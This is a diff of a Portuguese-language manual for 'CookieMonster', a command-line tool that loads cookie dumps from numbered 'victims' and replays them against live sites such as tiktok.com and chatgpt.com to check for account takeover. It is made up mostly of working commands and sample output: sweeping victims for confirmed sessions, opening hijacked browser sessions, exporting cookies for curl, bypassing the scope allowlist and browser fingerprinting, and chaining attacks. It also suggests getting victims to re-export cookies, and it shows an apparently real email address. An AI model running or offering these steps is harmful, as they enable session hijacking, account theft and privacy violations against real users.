-A função `detect_baseline_vs_injected()` em `cookiemonster/validate/auth_state.py` aplica esta árvore (a primeira regra que casa vence):
-
-| # | Condição | Estado | Confiança |
-|---|---|---|---|
-| 1 | injetado tem `login_redirect` | **ANONYMOUS** | 0.85 |
-| 2 | injetado tem `api_anon_status` (401/403) e baseline não | **ANONYMOUS** | 0.80 |
-| 3 | injetado tem `api_user_id/name/email` E (`api_authenticated` OU `authenticated_ui` OU `ui_markers`) | **CONFIRMED** | 0.90 |
-| 3a | injetado tem `api_user_id/name/email` mas **só API** (sem UI/auth flag) | **LIKELY (api_only)** | 0.70 |
-| 4 | injetado tem `api_authenticated` (200 com payload) e baseline não | **CONFIRMED** | 0.85 |
-| 5 | injetado tem `authenticated_ui` (markers) e baseline não | **LIKELY** | 0.70 |
-| 6 | injetado tem `ui_markers` e baseline não | **LIKELY** | 0.60 |
-| 7 | nenhum dos acima | **UNKNOWN** | 0.30 |
-
-**`api_only` (regra 3a)**: acontece em sites como NextAuth onde `/api/auth/session` retorna o JSON de identidade mas a UI web não reflete a sessão. Razões comuns:
-- O `__Secure-next-auth.session-token` da API é diferente do cookie de UI.
-- O cookie de UI expirou mas o JWT interno ainda é válido (até o servidor rotacionar).
-- A UI exige checagem extra (ex.: `cf_clearance` válido) que a API não exige.
-
-**Sinal prático:** você rodou `probe` contra `/api/auth/session` e deu CONFIRMED/LIKELY, mas ao abrir no navegador (`access`) a homepage mostra tela de login. Isso é `api_only` — o cookie de API está válido mas a UI exige mais. A ferramenta **não declara conta comprometida** nesse caso.
-
-**O que cada sinal significa na prática:**
-
-- `api_user_id_present` / `api_user_name_present` / `api_user_email_present` — um endpoint de identidade (`/api/auth/session`, `/me`, `/account`) retornou JSON com esses campos.
-- `api_authenticated` — endpoint de identidade retornou 200 com payload que parece autenticado, OU tem boolean `authenticated: true`.
-- `api_anon_status` — endpoint retornou 401/403.
-- `authenticated_ui` — DOM contém `Logout`, `My Account`, avatar pessoal, etc.
-- `login_redirect` — redirect 30x para `/login`, `/signin`, `openid`, etc.
-- `ui_markers` — heurística textual mais fraca (presença de strings como "Profile", "Settings").
-
-### 6.7 Por que tantos UNKNOWN em SPAs
-
-Sites como **chatgpt.com, claude.ai, primevideo.com** frequentemente resultam em UNKNOWN massivo mesmo com cookies válidos, porque:
-
-1. **SPA React/Vue/Angular**: a homepage renderiza client-side com a mesma UI para anônimo e autenticado (a tela de chat, por exemplo). O `final_url` é o mesmo e o `body_length_delta` é pequeno.
-2. **Sem endpoint público de identidade**: o cookie `__Secure-next-auth.session-token` é validado pelo `getServerSideProps` do Next.js, mas a homepage pública não expõe a identidade no HTML inicial.
-3. **Identidade só após interação**: clicar em "Settings" ou navegar para `/account` revela o email — mas o probe padrão não navega.
-
-**Como tentar melhorar:**
-- Rode `probe` apontando para a URL interna onde a identidade aparece: `python -m cookiemonster probe --domain chatgpt.com --url https://chatgpt.com/api/auth/session --allow-unsafe-scope`. O JSON de `/api/auth/session` tem `user.email` quando logado.
-- Use `access` para abrir o navegador e clicar manualmente — o `access` salva screenshot em `evidence/` que você pode inspecionar.
-- Tente `--max-wait-ms 15000` (mais tempo para SPAs renderizarem estado pós-redirect).
-
-### 6.8 Caso `api_only`: API reconheceu mas UI pediu login
-
-Fenômeno comum em SPAs NextAuth/Auth.js: você roda `probe` contra `/api/auth/session` e a ferramenta diz **CONFIRMED 0.90**, mas ao abrir `access` a homepage mostra tela de login com o email da vítima já preenchido pedindo senha.
-
-**Por que acontece:**
-- O cookie de API (`__Secure-next-auth.session-token` ou similar) é válido e o JWT interno (accessToken) ainda é aceito pelo backend.
-- Mas a UI web exige cookies adicionais (`cf_clearance` do Cloudflare, cookie de sessão do app, etc) que podem ter expirado.
-- A diferença entre "API autenticada" e "sessão web válida" é real: a API aceita o token mas a UI exige mais.
-
-**Como a ferramenta trata:**
-- A regra 3 da árvore de classificação rebaixa CONFIRMED para **LIKELY (api_only)** quando só a API reconhece e a UI não.
-- A confiança fica em 0.70.
-- O motivo `api_only_no_ui` aparece em `hints`/`unknown_reasons`.
-- O `access` salva screenshot em `evidence/` e detecta URLs de login.
-
-**Sinal concreto:** o run mostra `api_user_id_present: True` no JSON do endpoint mas `authenticated_ui: False` no DOM. Isso é `api_only`.
-
-**Ação recomendada:**
-1. Veja o screenshot em `evidence/access_<host>_<vid>.png`.
-2. Se a UI mostra o email da vítima já preenchido e só pede senha: a sessão API está OK mas a UI precisa de re-login (token de refresh + novo cookie de UI).
-3. Se a UI mostra tela de login genérica (sem email): cookies expiraram completamente.
-
-### 6.9 OAuth via terceiro (IdP detectado)
-
-Quando a vitima fez login via **Google, Facebook, GitHub, Auth0, Okta** etc (em vez de login direto), o JSON de `/api/auth/session` (ou equivalente) tem um campo `idp` (identity provider):
-
-```json
-{
-  "user": {
-    "id": "user-vnvjMiq83bcQ1M4RsScsHJqh",
-    "email": "jamesngoufack@gmail.com",
-    "idp": "google-oauth2"
-  },
-  "accessToken": "eyJhbGc..."
-}
-```
-
-**A ferramenta detecta automaticamente o IdP** e exibe na saída:
-
-```
->>> ESTADO: LIKELY (ACESSO PROVAVEL)
->>> Confianca: 0.70
->>> API reconheceu identidade, mas UI nao refletiu.
-    IdP detectado: google-oauth2 (login via terceiro)
-    A UI provavelmente exigira re-autenticacao
-    (cf_clearance expirado / IdP check de IP/fingerprint).
-```
-
-**Por que isso importa:**
-- Login via Google/Facebook/etc adiciona uma camada de checagem do IdP (IP, fingerprint, MFA challenge) que **não** está nos cookies capturados.
-- A API reconhece o `accessToken` JWT enquanto ele é válido (pode ser horas), mas a UI exige `cf_clearance` válido do Cloudflare para o seu IP (expira em ~30min) — e/ou o IdP pode pedir MFA se detectar IP novo.
-- Resultado: API autenticada, UI pedindo senha com email pré-preenchido.
-
-**IdPs comuns detectados:**
-- `google-oauth2`, `google` → Google Sign-In
-- `github` → GitHub OAuth
-- `facebook` → Facebook Login
-- `auth0` → Auth0 (universal login)
-- `okta` → Okta SSO
-- `apple` → Sign in with Apple
-- `azure-ad`, `microsoft` → Microsoft Entra ID
-
-**Quando você vê "IdP detectado":**
-1. **A UI vai pedir re-login** (mesmo que a API diga "logado") — isso é o `cf_clearance` ou o IdP recusando o IP/fingerprint novo.
-2. **A "sessão" no sentido prático é parcial**: você tem o JWT de API e o `user.id`, mas a sessão web completa exige uma nova autorização do IdP.
-3. **Re-captura de cookies pode resolver** — se a vitima ainda estiver logada no Google, pedir para ela re-exportar cookies após alguns minutos pode renovar o `cf_clearance`.
-
----
 
 ## 7. Troubleshooting
 
 ### "Recusado: alvo fora da allowlist"
+Adicione o dominio em `scope.txt` ou use `--allow-unsafe-scope`.
 
-Adicione o domínio em `scope.txt` ou use `--allow-unsafe-scope`.
+### "Nenhum cookie aplicavel"
+- Verifique dominio dos cookies vs URL alvo.
+- Verifique `secure` (cookie com `Secure` nao casa com `http://`).
+- Use `python -m cookiemonster cookies --victim <id> --domain <dom> --scheme <http|https>` para inspecionar.
 
-### "Nenhum cookie aplicável"
+### Playwright timeout
+Aumente `--max-wait-ms` (ate 20000 para SPAs muito lentas).
 
-O matcher RFC 6265 não encontrou cookies que casem com a URL. Verifique:
-- Domínio dos cookies vs. URL alvo.
-- Schema (http/https) e atributo `secure`.
-- Path (cookie com path `/api` não casa com `/`).
-
-Use `python -m cookiemonster cookies --victim <id> --domain <dom> --scheme <http|https>` para inspecionar.
-
-### Playwright falha com timeout
-
-Aumente `--max-wait-ms`. Para SPAs muito lentas, tente `--max-wait-ms 15000` ou `--max-wait-ms 20000`.
-
-### "missing field `evidence`" no JSON
-
-Recrie o `store.db` com `python -m cookiemonster ingest --resume` (deleta + re-insere). O problema é schema antigo sem a coluna `evidence_json` em `runs`.
-
-### Erros de Unicode no Windows Terminal
-
-É só visual (o cp1252 não tem certos glifos). Os dados no store estão UTF-8 corretamente. Use `python -m cookiemonster ... | Out-File -Encoding utf8` para output UTF-8.
+### `cookies.json` JSON dentro de arquivos `.txt`
+A ferramenta detecta automaticamente JSON mesmo em `.txt`. Vera `json files: N` no relatorio de ingest.
 
 ### Public Suffix List falhou
+Delete `%USERPROFILE%\.cache\cookiemonster\public_suffix_list.dat` para forcar refresh.
 
-O `util/psl.py` baixa a PSL com cache local. Se a rede estiver bloqueada, o fallback hardcoded é usado. Para forçar refresh: delete `%USERPROFILE%\.cache\cookiemonster\public_suffix_list.dat`.
+### Probe com Cloudflare bloqueia
+Use `--channel playwright` (httpx e detectado). Para bypass de fingerprint, use OPT-B (StealthProfile) — ver secao 13.
 
-### `access` abre o navegador mas aparece tela de login
+## 8. Referência de Comandos (18 CLI)
 
-A ferramenta nao consegue distinguir o motivo exato (servidor vs. fingerprint), mas geralmente significa:
+CookieMonster tem 18 comandos CLI. Aqui vao os principais com exemplos reais:
 
-1. **Cookies expirados/invalidados** — a vitima ja nao esta logada. Tente outra vitima (rode `probe-all` para encontrar uma CONFIRMED).
-2. **Cloudflare/anti-bot** — o `cf_clearance` da vitima so vale para o IP dela. Em outro IP, Cloudflare pede desafio.
-3. **Sessao revogada** — a vitima pode ter saido da conta em outro dispositivo.
-4. **Probe deu LIKELY mas o site pediu login** — LIKELY significa que a UI parece autenticada, mas sem identidade explicita. Nem sempre o servidor honrara os cookies.
-
-Dica: rode `python -m cookiemonster probe-all --domain X --allow-unsafe-scope` antes de tentar `access`, para encontrar vitimas com `state=CONFIRMED`. Esses sao os casos onde o servidor reconheceu a sessao de fato.
-
----
-
-## 8. Referência de Comandos
-
-### 8.1 `ingest`
-
-```
-python -m cookiemonster ingest [OPTIONS]
-
-  --dir DIRECTORY   Pasta raiz com subpastas de vítima (obrigatório)
-  --db PATH          Caminho do store SQLite (padrão: store.db)
-  --sample INTEGER   Limita às N primeiras vítimas
-  --resume           Pula vítimas já ingeridas
-```
-
-### 8.2 `victims`
-
-```
-python -m cookiemonster victims --db PATH
-```
-
-### 8.3 `domains`
-
-```
-python -m cookiemonster domains --db PATH [--victim ID] [--domain TEXT]
-```
-
-### 8.4 `best`
-
-```
-python -m cookiemonster best --db PATH --domain TEXT [--limit N]
-```
-
-### 8.5 `cookies`
-
-```
-python -m cookiemonster cookies --db PATH --victim ID --domain TEXT
-                                [--scheme https|http] [--path TEXT] [--limit N] [--show-value]
-```
-
-### 8.6 `inject`
-
-```
-python -m cookiemonster inject --db PATH --victim ID --domain TEXT --url TEXT
-                              [--channel playwright|httpx]
-                              [--path TEXT] [--screenshot PATH]
-                              [--replay-mode strict|browser_default|randomized]
-                              [--allow-unsafe-scope]
-```
-
-### 8.7 `check`
-
-```
-python -m cookiemonster check --db PATH --victim ID --domain TEXT
-                            [--url TEXT] [--channel playwright|httpx]
-                            [--path TEXT] [--screenshot PATH]
-                            [--replay-mode ...] [--max-wait-ms N]
-                            [--allow-unsafe-scope]
-```
-
-### 8.8 `check-batch`
-
-```
-python -m cookiemonster check-batch --db PATH --domain TEXT
-                                  [--limit N] [--channel playwright|httpx]
-                                  [--allow-unsafe-scope]
-```
-
-### 8.9 `edit`
-
-```
-python -m cookiemonster edit --db PATH --victim ID --domain TEXT --cookie NAME --value TEXT
-```
-
-### 8.10 `report`
-
-```
-python -m cookiemonster report --db PATH --out DIRECTORY
-```
-
-### 8.11 `probe` (pipeline unificado)
-
-```
-python -m cookiemonster probe [OPTIONS]
-
-  --db PATH                    [default: store.db]
-  --domain TEXT                Dominio alvo (obrigatorio)
-  --scheme [https|http]        [default: https]
-  --path TEXT                  [default: /]
-  --url TEXT                   URL alvo (padrao: scheme://host/path)
-  --channel [playwright|httpx] [default: playwright]
-  --max-wait-ms INTEGER        [default: 8000]
-  --replay-mode [...]          [default: strict]
-  --allow-unsafe-scope
-```
-
-Faz best + cookies + inject + check em um unico comando com saida amigavel mostrando vitima escolhida, artefatos auth, replay e estado final.
-
-### 8.12 `access` (abrir navegador)
-
-```
-python -m cookiemonster access [OPTIONS]
-
-  --db PATH
-  --domain TEXT
-  --victim INTEGER
-  --url TEXT
-  --scheme [https|http]        [default: https]
-  --path TEXT                  [default: /]
-  --replay-mode [...]          [default: strict]
-  --max-wait-ms INTEGER        [default: 10000]
-  --wait-enter/--no-wait-enter [default: wait-enter]
-  --allow-unsafe-scope
-```
-
-Abre o navegador (headed) com os cookies injetados. Aguarda ENTER para fechar (ou use --no-wait-enter para fechar automaticamente).
-
-### 8.13 `export-cookies` (cookie jar)
-
-```
-python -m cookiemonster export-cookies [OPTIONS]
-
-  --db PATH
-  --domain TEXT
-  --victim INTEGER
-  --scheme [https|http]        [default: https]
-  --path TEXT                  [default: /]
-  -o, --output PATH
-  --format [netscape|json]     [default: netscape]
-  --include-anon               Inclui anonimos (default: so auth)
-```
-
-Exporta os cookies aplicaveis ao alvo no formato Netscape/curl (ou JSON). Apenas cookies que passam o matcher RFC 6265 sao incluidos.
-
-Exemplo de uso:
+### `domains`
+Lista dominios e contagem de cookies.
 ```bash
-# Netscape/curl
-python -m cookiemonster export-cookies --domain amazon.com -o amazon.txt
-curl -b amazon.txt https://www.amazon.com/ap/signin
-
-# JSON (extensao de navegador)
-python -m cookiemonster export-cookies --domain github.com --format json -o github.json
+python -m cookiemonster domains
 ```
 
-### 8.14 `dashboard` (resumo amigavel)
-
-```
-python -m cookiemonster dashboard [OPTIONS]
-
-  --db PATH                    [default: store.db]
-  --limit INTEGER              [default: 10]
+### `victims`
+Lista vitimas ingeridas.
+```bash
+python -m cookiemonster victims
 ```
 
-Mostra um resumo amigavel de todos os runs: contagem por estado (CONFIRMED/LIKELY/ANONYMOUS/UNKNOWN), ultimos N runs, e destaque dos alvos com acesso confirmado (com comando para replicar).
-
-### Cancelamento gracioso
-
-`probe-all` pode ser cancelado a qualquer momento sem traceback:
-
-- **Ctrl+C (SIGINT)** — aguarda o worker em andamento terminar, salva o resumo parcial dos runs completos ate o cancelamento. Pressione Ctrl+C **2 vezes** para forcar abort imediato.
-- **ENTER (ou tecla `q`)** — em Windows, `msvcrt` captura tecla; em Linux/Mac, `select` no stdin. Mesma semantica do Ctrl+C.
-
-Apos cancelamento, voce vera:
-
-```
->>> Ctrl+C detectado. Aguardando workers atuais finalizarem...
-    (pressione Ctrl+C de novo para forcar abort)
-
-=== CANCELADO ===
-  Runs completos antes do cancelamento: 51/200
-  Dica: use --limit N para reduzir o universo de vitimas.
-
-Resumo parcial (3s, 51/200 vitimas)
-  ...
+### `best` (M1)
+Seleciona as melhores vitimas para um dominio.
+```bash
+python -m cookiemonster best --db store.db --domain tiktok.com --limit 5
 ```
 
-### 8.15 `probe-all` (varrer todas as vitimas)
-
+### `cookies` (M1)
+Lista cookies aplicaveis a um alvo.
+```bash
+python -m cookiemonster cookies --db store.db --victim 2390 --domain tiktok.com
 ```
-python -m cookiemonster probe-all [OPTIONS]
 
-  --db PATH
-  --domain TEXT                 [obrigatorio]
-  --limit INTEGER               [default: 0 (todas)]
-  --channel [playwright|httpx]  [default: playwright]
-  --workers INTEGER             [default: 3]
-  --max-wait-ms INTEGER         [default: 6000]
-  --replay-mode [...]           [default: strict]
+### `ingest` (M0)
+Ingere dumps de cookies.
+```bash
+python -m cookiemonster ingest --dir Cookies --db store.db --resume
+```
+
+### `inject` (M2)
+Injeta cookies num contexto HTTP ou Playwright.
+```bash
+python -m cookiemonster inject --db store.db --victim 2390 --domain tiktok.com --channel httpx
+```
+
+### `check` (M3)
+Valida 1 vitima (canalico).
+```bash
+python -m cookiemonster check --db store.db --victim 2390 --domain tiktok.com
+```
+
+### `check-batch` (M3)
+Valida N vitimas em lote.
+```bash
+python -m cookiemonster check-batch --db store.db --domain tiktok.com --limit 5
+```
+
+### `edit` (M2)
+Edita valor de cookie para teste de injecao.
+```bash
+python -m cookiemonster edit --db store.db --victim 2390 --cookie _octo --value "TESTE"
+```
+
+### `report` (M4)
+Consolida runs+findings em console, JSON e Markdown.
+```bash
+python -m cookiemonster report --db store.db --out reports
+```
+
+### `probe` (pipeline unificado — **comando principal**)
+Pipeline `best + cookies + inject + check` com saida M6.0 estruturada.
+```bash
+# Reproduzivel rapido
+python -m cookiemonster probe --domain tiktok.com --allow-unsafe-scope
+
+# Com URL custom (para endpoints de identidade)
+python -m cookiemonster probe --domain chatgpt.com \
+  --url https://chatgpt.com/api/auth/session --allow-unsafe-scope
+
+# Com stealth profile (OPT-B)
+python -m cookiemonster probe --domain tiktok.com \
+  --stealth-profile ~/.config/cookiemonster/stealth/lab-canvas-noise.json \
   --allow-unsafe-scope
 ```
 
-Executa o pipeline `best + cookies + inject + check` em **TODAS as vitimas candidatas do dominio**, em paralelo, com progresso em tempo real.
-
-Quando usar:
-- **Triagem rapida**: `--channel httpx` (~1s por vitima, ideal para 100+ vitimas).
-- **Validacao forte**: `--channel playwright` (replica sessao real, ~5-15s por vitima).
-- Use `--limit N` para testar apenas o top N (mais rapido).
-- Use `--workers` para paralelizar (Playwright: max 4 recomendado).
-
-Exemplo de saida:
-
+**Saida real** (chatgpt.com + Google OAuth):
 ```
-=== CookieMonster: probe-all tiktok.com ===
-  Total de vitimas candidatas: 3
-  Canal: playwright  Workers: 3  Replay-mode: strict
-  (inicando paralelo, isso pode levar minutos...)
-
-[1/3]    10s (eta   20s) vid= 2197 state=UNKNOWN   auth=9
-[2/3]    10s (eta    5s) vid= 2793 state=UNKNOWN   auth=10
-[3/3]    17s (eta    0s) vid= 2390 state=CONFIRMED auth=11
-
-Resumo (17s, 3 vitimas)
-  CONFIRMED (acesso confirmado): 1
-  UNKNOWN   (indeterminado):     2
-
-Detalhes (top 30)
-    VID      STATE   CONF  AUTH  TOTAL  FINAL_URL
-   2390  CONFIRMED   0.90    11    378  https://www.tiktok.com/
-   2197    UNKNOWN   0.30     9    188  https://www.tiktok.com/
-   2793    UNKNOWN   0.30    10    109  https://www.tiktok.com/
-
->>> Alvos com acesso (CONFIRMED/LIKELY):
-  - tiktok.com vitima=2390 state=CONFIRMED conf=0.90
-
-  Replicar acesso:
-    python -m cookiemonster access --domain tiktok.com --victim 2390 --allow-unsafe-scope
-  Exportar cookies:
-    python -m cookiemonster export-cookies --domain tiktok.com --victim 2390 -o tiktok.com_cookies.txt
+[4] REPLAY RESULT (M6.0 AuthContext)
+    >>> Classification: IDP_BOUND (ACESSO BLOQUEADO POR IDP)
+    >>> Confidence:     0.85
+    >>> Reason:         identity_provider_boundary:google
+    >>> Mechanism:      oidc
+    >>> IdP:            google
+    >>> Dependencies:   idp
 ```
 
----
+### `probe-all` (varias vitimas em paralelo)
+Executa probe em TODAS as vitimas de um dominio.
+```bash
+# httpx rapido (3 vitimas em ~2s)
+python -m cookiemonster probe-all --domain tiktok.com \
+  --channel httpx --limit 3 --workers 3 --allow-unsafe-scope
 
-## 9. Estrutura do Projeto
-
-```
-CookieMonster/
-├── cookiemonster/         # pacote principal
-│   ├── ingest/            # parser Netscape/JSON + orchestrator
-│   ├── store/             # SQLite store (schema + db)
-│   ├── domain/            # RFC 6265 matcher + auth heuristics
-│   ├── inject/            # replay via httpx + Playwright + AuthProbe
-│   ├── validate/          # detector diferencial + perfis de site
-│   ├── report/            # console + JSON + Markdown
-│   ├── util/              # PSL, stealth, rate limit, scope guardrail
-│   └── cli.py             # Click commands
-├── lab/                   # mock server (Python puro) + smoke scripts
-├── tests/                 # 68 testes pytest
-├── reports/               # saída dos relatórios
-├── Cookies/               # (gitignored) dumps de cookies de teste
-├── store.db               # (gitignored) SQLite gerado pelo ingest
-├── scope.txt              # allowlist de escopo
-├── ROADMAP.md             # roadmap M0–M5
-├── CHANGELOG.md           # histórico de versões
-├── docs/
-│   ├── ARCHITECTURE.md    # arquitetura técnica
-│   └── MANUAL.md          # este arquivo
-└── pyproject.toml         # dependências e entry point
+# Playwright (mais lento, 3 vitimas em ~15s)
+python -m cookiemonster probe-all --domain chatgpt.com \
+  --channel playwright --limit 3 --max-wait-ms 10000 --allow-unsafe-scope
 ```
 
----
+Suporta **Ctrl+C** para cancelamento gracioso (para quando achar autenticado ou bloqueado consistente).
 
-## 10. Onde Pedir Ajuda
+### `access` (headed browser)
+Abre Chrome com cookies injetados. Voce interage visualmente.
+```bash
+python -m cookiemonster access --domain tiktok.com --allow-unsafe-scope
+
+# Com vitima especifica
+python -m cookiemonster access --domain tiktok.com --victim 2390 --allow-unsafe-scope
+
+# Sem esperar ENTER (fecha apos timeout)
+python -m cookiemonster access --domain tiktok.com --no-wait-enter --max-wait-ms 10000
+```
+
+Salva screenshot em `evidence/access_<host>_<vid>.png`. Detecta se a URL final caiu em pagina de login.
+
+### `export-cookies`
+Exporta cookies aplicaveis em formato Netscape (curl) ou JSON.
+```bash
+# Netscape (pronto para curl)
+python -m cookiemonster export-cookies --domain tiktok.com -o tiktok.txt
+curl -b tiktok.txt https://www.tiktok.com/
+
+# JSON (estruturado)
+python -m cookiemonster export-cookies --domain tiktok.com --format json -o tiktok.json
+```
+
+### `dashboard` (resumo amigavel)
+Mostra os ultimos runs com classificacao.
+```bash
+python -m cookiemonster dashboard
+
+# Mais runs
+python -m cookiemonster dashboard --limit 50
+```
+
+**Saida real** (depois de varios probes):
+```
+TOTAL: 136 runs
+  CONFIRMED (acesso confirmado): 3
+  LIKELY (acesso provavel):       3
+  ANONYMOUS (acesso rejeitado):   32
+  UNKNOWN (indeterminado):       82
+
+Diagnostico dos 82 UNKNOWN (motivos):
+  sem_diferencial                82 runs
+```
+
+### `matrix` (M6.2 — Replay Matrix)
+Identifica dependencias da sessao via variacoes de contexto.
+```bash
+python -m cookiemonster matrix --domain tiktok.com --max-variants 4 --allow-unsafe-scope
+```
+
+**Saida real**:
+```
+Variantes da matriz:
+  1. net=default,br=default,ck=none
+  2. net=default,br=default,ck=artifact
+  3. net=default,br=preserved,ck=none
+  4. net=default,br=preserved,ck=artifact
+
+  net=default,br=default,ck=none      state=INCONCLUSIVE  0.30  1.0s
+  net=default,br=default,ck=artifact  state=INCONCLUSIVE  0.30  0.8s
+  ...
+
+=== DEPENDENCY ANALYSIS ===
+  Dependencies inferred: inconclusive
+  Evidencia insuficiente para inferir dependencias.
+```
+
+### `correlate` (M6.3 — Grafo de correlacao + OPT-A AttackChains)
+Constroi grafo de Findings + Attack Chains.
+```bash
+# Ultimos 10 runs
+python -m cookiemonster correlate --limit 10
+
+# Filtrar por dominio
+python -m cookiemonster correlate --domain chatgpt.com --limit 5
+
+# Com regras customizadas (OPT-C)
+python -m cookiemonster correlate --rules-file my-rules.yaml --limit 5
+
+# Salvar Markdown
+python -m cookiemonster correlate --limit 5 --out graph.md
+```
+
+**Saida real**:
+```
+Findings: 40
+  session_artifact                    10
+  session_replayable                  10
+  ...
+Graph: 40 nodes, 200 edges
+
+Attack Chains (10):
+
+--- Chain #1 ---
+  [INFO    ] session_artifact               (1.00) @ tiktok.com run#139
+  [INFO    ] session_replay                 (0.30) @ tiktok.com run#139
+```
+
+### `attack-plan` (M7 — Orquestracao declarativa YAML)
+Executa pipeline completo (discover → classify → replay → observe → correlate) com stop conditions e Impact assessment.
+
+**Exemplo de YAML** (ver secao 12 para detalhes):
+```yaml
+target: tiktok.com
+victim: 2390
+phases: [discover, classify, replay, observe, correlate]
+replay:
+  transports: [http, browser]
+  max_victims: 10
+  workers: 3
+stop_conditions: [authenticated, blocked]
+```
+
+**Execucao**:
+```bash
+# Plan minimo via CLI
+python -m cookiemonster attack-plan --target tiktok.com --allow-unsafe-scope
+
+# Plan completo via YAML
+python -m cookiemonster attack-plan --plan-file my-plan.yaml --allow-unsafe-scope
+```
+
+**Saida real** (5 phases em 18s):
+```
+=== CookieMonster: attack-plan ===
+  Plan ID:   94999e06
+  Target:    tiktok.com
+  Phases:    discover -> classify -> replay -> observe -> correlate
+
+# AttackPlan: tiktok.com
+  Duration: 18.4s
+
+## 8.5 Exemplo de saida real (Impact Assessment)
+
+```
+## Impact Assessment
+  Severity:    INFO
+  Confidence:  0.50
+  Authenticated: False
+
+## Phases
+  * discover     OK (4.8s, 1 findings)
+```
+  * classify     OK (6.8s, 0 findings)
+  * replay       OK (6.8s, 0 findings)
+  * observe      OK (0.0s, 1 findings)
+  * correlate    OK (0.0s, 1 findings)
+
+>>> IMPACT: INFO <<<
+```
+
+## 9. M6.0 AuthContext — Detecção de IdP e proteções
+
+A partir de M6.0, CookieMonster detecta **automaticamente** o contexto de autenticacao do alvo:
+
+- **8 Identity Providers**: Google, Microsoft, GitHub, Facebook, Apple, Auth0, Okta, AWS Cognito.
+- **6 Auth Mechanisms**: cookie_session, oauth, oidc, saml, jwt_bearer, api_key.
+- **5 Session Types**: server_side_cookie, jwt_cookie, jwt_local_storage, jwt_memory, opaque_token.
+- **2 Protecoes**: anti-bot (Cloudflare, reCAPTCHA), MFA (mfa_required, amr claims).
+
+### Detectores passiveis (sem bypass)
+
+O `AuthDetector` em `cookiemonster/auth/detector.py` usa fingerprints passiveis:
+
+```python
+from cookiemonster.auth import detect_all, classify
+
+# Observacao de uma unica requisicao (body, url, cookies, title):
+observation = {
+    "url": "https://x.com/api/auth/session",
+    "body": '{"user": {"email": "x@y.com", "idp": "google-oauth2"}, "id_token": "eyJ..."}',
+    "html": "...", "title": "x",
+    "cookie_names": ["__Secure-next-auth.session-token"],
+}
+
+ctx = detect_all(observation, target="x.com")
+# ctx.identity_provider == IdentityProvider.GOOGLE
+# ctx.auth_mechanism == AuthMechanism.OIDC
+
+# Classificacao com evidencias:
+from cookiemonster.auth import classify
+result = classify(
+    inj={"api_user_id_present": True, "api_authenticated": True, "authenticated_ui": False},
+    base={"api_user_id_present": False, "api_authenticated": False, "authenticated_ui": False},
+    ctx=ctx,
+)
+# result["state"] == "idp_bound"
+# result["context_dependencies"] == ["idp"]
+```
+
+### Caso `api_only` (API reconhece mas UI nao)
+
+Quando a API reconhece a identidade (`api_user_id_present: True`) mas a UI nao confirma (`authenticated_ui: False`), a ferramenta classifica como `IDP_BOUND` (rebaixado de `AUTHENTICATED`) com motivo `api_only_no_ui`. Isso acontece com:
+
+- **NextAuth/Auth.js** com cookies parcialmente expirados (cookie de API ok + cookie de UI expirado).
+- **OAuth com IdP externo** (Google) onde `cf_clearance` foi invalidado por mudança de IP.
+
+A ferramenta **nao afirma** que a sessao esta quebrada — ela classifica e mostra o motivo para o operador decidir.
+
+### Quando `IDP_BOUND` aparece
+
+```
+[4] REPLAY RESULT (M6.0 AuthContext)
+    >>> Classification: IDP_BOUND (ACESSO BLOQUEADO POR IDP)
+    >>> Reason:         identity_provider_boundary:google
+    >>> IdP:            google (login via terceiro)
+    >>> Dependencies:   idp
+    >>> Sessao requer validacao no Identity Provider externo.
+        (cf_clearance expirado / IdP check de IP/fingerprint).
+```
+
+**Acoes sugeridas**:
+1. Veja screenshot em `evidence/access_<host>_<vid>.png`.
+2. Se a UI mostra email da vitima pedindo senha: sessao API esta OK, UI precisa de re-login.
+3. Se a UI mostra login generico: cookies expiraram completamente.
+
+## 10. M6.2 ReplayMatrix — Identificar dependências
+
+`matrix` executa variacoes de contexto (network × browser × cookies) e infere **automaticamente** o que a sessao reproduzida depende.
+
+### Matriz canonica (5 variants)
+
+| Variant | network | browser | cookies |
+|---|---|---|---|
+| B0 (baseline) | default | default | none |
+| R1 (canonical) | default | default | artifact |
+| R2 (network_alt) | controlled_alternate | default | artifact |
+| R3 (browser_pres) | default | preserved | artifact |
+| R4 (combined) | controlled_alternate | preserved | artifact |
+
+### Dependency analysis (5 cenarios)
+
+| Dependencia inferida | Significado |
+|---|---|
+| `cookie_only` | Todas variants autenticam (replay funciona sem contexto extra) |
+| `network` | Canonical autentica mas network_alt nao (sessao exige IP) |
+| `browser` | Canonical autentica mas browser_pres nao (sessao exige fingerprint) |
+| `context` | Nenhuma autentica mas combined sim (precisa de contexto adicional) |
+| `inconclusive` | Sem dados suficientes |
+
+### Stop conditions
+
+A matriz para cedo quando:
+- **authenticated_found**: alguma variant deu AUTHENTICATED.
+- **bot_blocked_consistent**: >=2 variants dao BOT_BLOCKED.
+- **anonymous_consistent**: >=2 variants dao ANONYMOUS.
+
+### Limitacoes atuais
+
+- `network_alternate` e `browser_preserved` ainda nao estao **implementados** no executor (apenas marcam a variant). O resultado eh sempre `INCONCLUSIVE` ate voce usar um proxy real ou fingerprint preservado. Para lab, isso eh proposital — em producao, voce adiciona SOCKS5 (fora do escopo).
+
+## 11. M6.3 Correlator + OPT-A AttackChain
+
+`correlate` le runs do DB, gera **Findings canonicos**, aplica **9 regras declarativas**, e constroi um **grafo de correlacao**.
+
+### Finding canônico (14 tipos)
+
+```
+SESSION_ARTIFACT, SESSION_REPLAYABLE, SESSION_REPLAY,
+AUTH_STATE_CONFIRMED, AUTH_STATE_REJECTED, AUTH_STATE_INDETERMINATE,
+SESSION_CONTEXT_BOUND, AUTH_BOUNDARY, MFA_BLOCK, ANTI_BOT_BLOCK,
+DEPENDENCY_INFERRED, AUTHENTICATED_STATE, PROTECTED_RESOURCE
+```
+
+### 9 regras default
+
+| if | and | then | Descricao |
+|---|---|---|---|
+| SESSION_ARTIFACT | | enables SESSION_REPLAY | Cookie dump habilita replay |
+| SESSION_REPLAYABLE | | enables SESSION_REPLAY | Matching RFC 6265 habilita replay |
+| SESSION_REPLAY | AUTH_STATE_CONFIRMED | enables AUTHENTICATED_STATE | Replay+confirmed habilita auth |
+| AUTH_STATE_CONFIRMED | | enables PROTECTED_RESOURCE | Confirmed habilita recurso |
+| AUTH_BOUNDARY | | blocks AUTHENTICATED_STATE | IdP bloqueia auth |
+| MFA_BLOCK | | blocks AUTHENTICATED_STATE | MFA bloqueia auth |
+| ANTI_BOT_BLOCK | | blocks SESSION_REPLAY | Anti-bot bloqueia replay |
+| AUTH_STATE_REJECTED | | blocks AUTHENTICATED_STATE | Rejected bloqueia auth |
